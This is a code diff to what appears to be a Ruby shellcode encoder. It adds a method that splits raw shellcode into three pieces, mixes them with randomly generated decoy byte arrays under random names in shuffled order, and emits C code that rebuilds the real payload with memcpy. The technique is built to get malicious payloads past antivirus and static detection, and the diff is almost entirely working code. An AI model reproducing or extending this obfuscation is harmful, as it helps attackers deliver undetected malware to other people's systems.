@@ -18,12 +18,55 @@ class Mixed
 
 
     def generate
+        raw_code = @raw_code
+
+        raw_code = Encoder::cshellcode_pretreat(raw_code)
+        shellcode_array =  random_split_str(raw_code,3)
+
+        fake_shellcode_array = random_split_str(Encoder::hex_to_rubyshellcode(SecureRandom.hex(rand(200..300))),3)
+
+        function_hash = {}
+        function_hash["shellcode1"] = random_funcname()
+        function_hash["shellcode2"] = random_funcname()
+        function_hash["shellcode3"] = random_funcname()
+        function_hash["fake_code1"] = random_funcname()
+        function_hash["fake_code2"] = random_funcname()
+        function_hash["fake_code3"] = random_funcname()
+        function_hash["total_code"] = random_funcname()
+        @shellcode_name = function_hash["total_code"]
+
+        code_hash = {}
+        code_hash["shellcode1"] = Encoder::c_shellcode_format(shellcode_array[0])
+        code_hash["shellcode2"] = Encoder::c_shellcode_format(shellcode_array[1])
+        code_hash["shellcode3"] = Encoder::c_shellcode_format(shellcode_array[2])
+        code_hash["fake_code1"] = Encoder::ruby_to_c_shellcode(fake_shellcode_array[0])
+        code_hash["fake_code2"] = Encoder::ruby_to_c_shellcode(fake_shellcode_array[1])
+        code_hash["fake_code3"] = Encoder::ruby_to_c_shellcode(fake_shellcode_array[2])
+
+        code_hash = Hash[code_hash.to_a.shuffle]
+
+        # encoded code
+        @encoded_code = ""
+        code_hash.each_pair do |k,v|
+            @encoded_code << %Q{unsigned char #{function_hash[k]}[] = \n}
+            @encoded_code << "#{v} \n"
+        end
+
+        buf_malloc_size = rand(@raw_code.length+100..@raw_code.length+200)
+        @encoded_code << %Q{unsigned char #{function_hash["total_code"]}[#{buf_malloc_size}] = "" ; \n}
+
+        # decode code 
+
+        @decoded_code =   %Q{memcpy(#{function_hash["total_code"]},#{function_hash["shellcode1"]},sizeof(#{function_hash["shellcode1"]})); \n}
+        @decoded_code <<  %Q{memcpy(#{function_hash["total_code"]}+sizeof(#{function_hash["shellcode1"]})-1,#{function_hash["shellcode2"]},sizeof(#{function_hash["shellcode2"]})); \n}
+        @decoded_code <<  %Q{memcpy(#{function_hash["total_code"]}+sizeof(#{function_hash["shellcode1"]})+sizeof(#{function_hash["shellcode2"]})-2,#{function_hash["shellcode3"]},sizeof(#{function_hash["shellcode3"]})); \n}
 
         return @encoded_code,@decoded_code,@shellcode_name
 
     end
 
 end
+
 
 class Xor
     def initialize(raw_code)
@@ -70,14 +113,6 @@ class Xor
     end
 
 end
-
-
-
-
-
-
-
-
 
 
 
